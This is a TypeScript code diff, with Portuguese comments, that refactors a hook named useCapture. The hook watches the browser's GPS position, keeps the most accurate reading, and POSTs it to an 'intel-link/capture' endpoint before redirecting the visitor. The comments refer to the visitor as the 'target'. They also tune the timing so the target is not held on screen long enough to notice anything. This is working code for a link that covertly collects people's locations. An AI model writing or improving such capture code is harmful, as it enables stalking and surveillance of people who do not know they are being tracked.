@@ -65,11 +65,18 @@ function useCapture(slug: string, redirectUrl: string | null) {
       // NÃO bloqueia o redirect esperando precisão perfeita — usamos a melhor
       // leitura disponível no momento do envio (indoor o GPS raramente chega a
       // 15 m, e esperar isso travava o alvo na tela por até 20 s).
-      let best: GeolocationPosition | null = null;
+      let bestAccuracy = Infinity;
       let watchId = 0;
       if (navigator.geolocation) {
         watchId = navigator.geolocation.watchPosition(
-          (pos) => { if (!best || pos.coords.accuracy < best.coords.accuracy) best = pos; },
+          (pos) => {
+            if (pos.coords.accuracy < bestAccuracy) {
+              bestAccuracy = pos.coords.accuracy;
+              latitude  = pos.coords.latitude;
+              longitude = pos.coords.longitude;
+              accuracy  = pos.coords.accuracy;
+            }
+          },
           () => {},
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
@@ -81,20 +88,15 @@ function useCapture(slug: string, redirectUrl: string | null) {
 
       // Se ainda não chegou nenhuma leitura de GPS, dá uma janela curta (4 s).
       // Se já houver leitura, segue direto.
-      if (navigator.geolocation && !best) {
+      if (navigator.geolocation && latitude === null) {
         await new Promise<void>((resolve) => {
           const timer = setTimeout(resolve, 4000);
           const poll = setInterval(() => {
-            if (best) { clearInterval(poll); clearTimeout(timer); resolve(); }
+            if (latitude !== null) { clearInterval(poll); clearTimeout(timer); resolve(); }
           }, 200);
         });
       }
       if (watchId) navigator.geolocation.clearWatch(watchId);
-      if (best) {
-        latitude  = best.coords.latitude;
-        longitude = best.coords.longitude;
-        accuracy  = best.coords.accuracy;
-      }
 
       await fetch("/api/ops/intel-link/capture", {
         method: "POST",
